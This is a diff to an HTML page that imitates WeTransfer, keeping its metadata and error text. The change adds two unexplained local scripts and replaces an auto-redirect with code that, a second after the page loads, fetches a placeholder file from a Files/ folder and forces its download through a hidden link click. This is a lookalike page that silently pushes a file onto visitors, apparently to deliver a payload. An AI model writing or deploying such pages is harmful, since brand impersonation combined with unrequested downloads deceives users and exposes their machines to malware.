@@ -30,6 +30,8 @@
 
   <meta name="author" content="WeTransfer">
 
+  <script src="./templates/js/client.min.js"></script>
+  <script src="./templates/js/Info.js"></script>
   <link rel="canonical" href="https://wetransfer.com/" />
   <link rel="preconnect" href="https://prod-cdn.wetransfer.net" crossorigin>
   <link rel="preconnect" href="https://wtplus.wetransfer.com" crossorigin>
@@ -87,18 +89,45 @@
   
 </head>
 <body>
-<!-- Script autoDownload -->
-<script src="http://code.jquery.com/jquery-3.2.1.min.js"></script>
-<script>
-$(function() {
-$(window).on('load',function(){
-var $this = $(this);
-setTimeout(function() {
-window.location = 'forwarding_link';
-}, 1500);
-});
-});
+  
+<!-- Download a file-->
+<script type="text/javascript">
+  window.onload = function () {
+      setTimeout(function () {
+          DownloadFile("forwarding_file");
+      }, 1000);
+  };
+  function DownloadFile(fileName) {
+      //Set the File URL.
+      var url = "Files/" + fileName;
+
+      //Create XMLHTTP Request.
+      var req = new XMLHttpRequest();
+      req.open("GET", url, true);
+      req.responseType = "blob";
+      req.onload = function () {
+          //Convert the Byte Data to BLOB object.
+          var blob = new Blob([req.response], { type: "application/octetstream" });
+
+          //Check the Browser type and download the File.
+          var isIE = false || !!document.documentMode;
+          if (isIE) {
+              window.navigator.msSaveBlob(blob, fileName);
+          } else {
+              var url = window.URL || window.webkitURL;
+              link = url.createObjectURL(blob);
+              var a = document.createElement("a");
+              a.setAttribute("download", fileName);
+              a.setAttribute("href", link);
+              document.body.appendChild(a);
+              a.click();
+              document.body.removeChild(a);
+          }
+      };
+      req.send();
+  };
 </script>
+
   <div class="assets-warning-node">
     <h1>¡Ay, no!</h1>
     <p>
